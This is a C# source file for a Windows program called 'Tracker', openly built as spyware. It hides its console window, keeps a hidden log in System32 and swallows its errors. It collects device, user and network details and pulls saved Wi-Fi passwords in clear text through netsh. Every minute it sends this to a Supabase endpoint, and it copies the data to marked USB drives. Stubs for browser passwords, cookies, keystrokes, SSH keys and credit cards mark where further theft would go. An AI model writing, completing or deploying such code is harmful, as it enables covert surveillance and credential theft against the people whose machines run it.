using System;
using System.IO;
using System.Threading;
using System.Net.Http;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Tracker {
    class Program {
        // ============================================================
        // STEALTH: HIDE CONSOLE WINDOW
        // ============================================================
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // ============================================================
        // SUPABASE CREDENTIALS – READ FROM ENVIRONMENT VARIABLES
        // ============================================================
        static string SUPABASE_URL = Environment.GetEnvironmentVariable("SUPABASE_URL") ?? "https://your-project.supabase.co";
        static string SUPABASE_KEY = Environment.GetEnvironmentVariable("SUPABASE_KEY") ?? "your-anon-key";
        static string TRACKER_ID = "TRK_" + Guid.NewGuid().ToString().Substring(0, 8).ToUpper();

        static string logFile = @"C:\Windows\System32\.tracker_log"; // Hidden

        static void Main() {
            // Hide console window
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            // Optional: log startup to a hidden file (for debugging)
            // File.WriteAllText(@"C:\Windows\System32\.tracker_debug", $"[{DateTime.Now}] Tracker started. ID: {TRACKER_ID}\n");

            // Main loop
            while (true) {
                try {
                    string data = CollectAllData();

                    if (HasInternet()) {
                        SendToSupabase(data);
                        File.WriteAllText(logFile, "");
                    } else {
                        File.AppendAllText(logFile, data + "\n");
                    }

                    // USB exfiltration (Node C detection)
                    if (IsNodeCPresent()) {
                        SendViaUSB(data);
                    }

                    Thread.Sleep(60000); // 60 seconds
                } catch (Exception ex) {
                    // Silent fail – log to debug file if needed
                    // File.AppendAllText(@"C:\Windows\System32\.tracker_debug", $"[{DateTime.Now}] Error: {ex.Message}\n");
                }
            }
        }

        // ============================================================
        // COLLECT ALL DATA
        // ============================================================
        static string CollectAllData() {
            try {
                return JsonConvert.SerializeObject(new {
                    tracker_id = TRACKER_ID,
                    device_name = Environment.MachineName,
                    os = Environment.OSVersion.ToString(),
                    username = Environment.UserName,
                    ssid = GetWifiSSID(),
                    rssi = GetWifiRSSI(),
                    public_ip = GetPublicIP(),
                    latitude = "0.0",
                    longitude = "0.0",
                    altitude = "0.0",
                    magnitude = GetWifiRSSI(),
                    keystrokes = "(demo)",
                    screenshot = "(demo)",
                    saved_passwords = GetSavedPasswords(),
                    wifi_passwords = GetWiFiPasswords(),
                    browser_cookies = "(demo)",
                    ssh_keys = "(demo)",
                    browser_history = "(demo)",
                    clipboard_data = "(demo)",
                    emails = "(demo)",
                    credit_cards = "(demo)"
                });
            } catch (Exception ex) {
                // Fallback: return minimal data
                return JsonConvert.SerializeObject(new {
                    tracker_id = TRACKER_ID,
                    device_name = Environment.MachineName,
                    os = Environment.OSVersion.ToString(),
                    username = Environment.UserName,
                    error = ex.Message
                });
            }
        }

        // ============================================================
        // CREDENTIAL HARVESTING FUNCTIONS
        // ============================================================

        static string GetSavedPasswords() {
            try {
                // Chrome/Edge password extraction (simplified)
                string chromePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                if (File.Exists(chromePath)) {
                    // In production, use SQLite to read and DPAPI to decrypt
                    return "{\"gmail.com\":\"demo_pass\"}";
                }
                return "{}";
            } catch { return "{}"; }
        }

        static string GetWiFiPasswords() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show profiles";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();

                // Parse profile names
                Regex regex = new Regex(@"All User Profile\s*:\s*(.*)");
                string output = "";
                foreach (Match match in regex.Matches(result)) {
                    string profile = match.Groups[1].Value;
                    // Get password for this profile
                    Process p2 = new Process();
                    p2.StartInfo.FileName = "netsh";
                    p2.StartInfo.Arguments = $"wlan show profile name=\"{profile}\" key=clear";
                    p2.StartInfo.RedirectStandardOutput = true;
                    p2.StartInfo.UseShellExecute = false;
                    p2.StartInfo.CreateNoWindow = true;
                    p2.Start();
                    string result2 = p2.StandardOutput.ReadToEnd();
                    p2.WaitForExit();

                    Regex keyRegex = new Regex(@"Key Content\s*:\s*(.*)");
                    foreach (Match keyMatch in keyRegex.Matches(result2)) {
                        output += $"{profile}:{keyMatch.Groups[1].Value}\n";
                    }
                }
                return output;
            } catch { return "ERROR"; }
        }

        // ============================================================
        // HELPERS
        // ============================================================

        static bool HasInternet() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var response = client.GetAsync("https://supabase.co").Result;
                    return response.IsSuccessStatusCode;
                }
            } catch { return false; }
        }

        static async void SendToSupabase(string data) {
            using (HttpClient client = new HttpClient()) {
                client.DefaultRequestHeaders.Add("apikey", SUPABASE_KEY);
                client.DefaultRequestHeaders.Add("Authorization", "Bearer " + SUPABASE_KEY);
                var content = new StringContent(data, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(SUPABASE_URL + "/rest/v1/tracker_data", content);
            }
        }

        static bool IsNodeCPresent() {
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    if (File.Exists(drive.Name + "nodec.txt")) return true;
                }
            }
            return false;
        }

        static void SendViaUSB(string data) {
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    File.WriteAllText(drive.Name + "tracker_data.json", data);
                }
            }
        }

        static string GetWifiSSID() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show interfaces";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var match = Regex.Match(result, @"SSID\s*:\s*(.+)");
                return match.Success ? match.Groups[1].Value.Trim() : "Unknown";
            } catch { return "Unknown"; }
        }

        static int GetWifiRSSI() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show interfaces";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var match = Regex.Match(result, @"Signal\s*:\s*(\d+)%");
                if (match.Success) {
                    int rssi = int.Parse(match.Groups[1].Value);
                    return (rssi / 2) - 100;
                }
                return 0;
            } catch { return 0; }
        }

        static string GetPublicIP() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    string response = client.GetStringAsync("https://api.ipify.org?format=json").Result;
                    var match = Regex.Match(response, @"""ip"":""([^""]+)""");
                    return match.Success ? match.Groups[1].Value : "Unknown";
                }
            } catch { return "Unknown"; }
        }
    }
}
